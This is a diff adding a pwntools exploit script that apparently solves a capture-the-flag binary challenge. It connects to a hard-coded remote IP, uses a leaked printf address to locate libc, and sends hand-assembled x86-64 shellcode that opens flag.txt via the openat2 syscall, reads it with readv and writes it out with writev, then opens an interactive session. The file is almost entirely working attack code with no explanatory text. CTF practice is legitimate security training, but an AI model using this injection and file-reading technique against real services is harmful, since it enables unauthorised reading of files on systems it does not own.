@@ -1,0 +1,79 @@
+#!/usr/bin/env python3
+from pwn import *
+import warnings
+warnings.filterwarnings("ignore")
+exe = ELF("./challengee")
+# context.log_level='debug'
+p = remote("152.69.210.130", 3001)
+# p = remote("127.0.0.1", 3001)
+libc = ELF("./libc.so.6")
+# p = process([exe.path])
+def gdbs():
+    context.terminal = ["foot"]
+    gdb.attach(p, gdbscript="""
+
+               """)
+    # p = gdb.debug([exe.path],"""
+    #
+    #                 """)
+
+sla = lambda msg, data: p.sendlineafter(msg, data)
+sa = lambda msg, data: p.sendafter(msg, data)
+sl = lambda data: p.sendline(data)
+s = lambda data: p.send(data)
+p.recvuntil("e gift for you: ")
+addr = int(p.recv(14),16)
+log.info(f"{hex(addr) = }")
+libc.address = addr - libc.sym.printf
+input()
+
+# gdbs()
+flagname = b"flag.txt\0"
+buffer = flagname
+chunk_size = 8
+chunks = [buffer[i:i + chunk_size] for i in range(0, len(buffer), chunk_size)]
+inst = "mov rdi,0\npush rdi\n"
+for i in range(len(chunks)):
+    inst += f"mov rdi,{u64(chunks[len(chunks)-i-1].ljust(8,b"\0").ljust(8,b"\0"))}\n"+f"push rdi\n"
+log.info(f"{inst = }")
+shellcode = asm(f"""
+                push 1
+                push 0
+                push 0
+                mov rdx,rsp
+                mov rax, 0x1b5
+                {inst}
+                mov rsi,rsp
+                mov rdi,{-100&0xffffffffffffffff}
+                mov r10, 24
+                sub rsp, 0x100
+                syscall
+                mov rdi,rax
+                mov rax,19
+                mov rdx,rsp
+                push 0
+                push 0x100
+                push rdx
+                mov rsi,rsp
+                mov rdx,1
+                syscall
+                mov rdi,1
+                mov rdx,1
+                mov rax,0x14
+                syscall
+                
+                
+
+                """,arch="amd64")
+# input()
+sl(shellcode)
+
+
+
+
+
+
+
+p.interactive()
+# good luck pwning :)
+
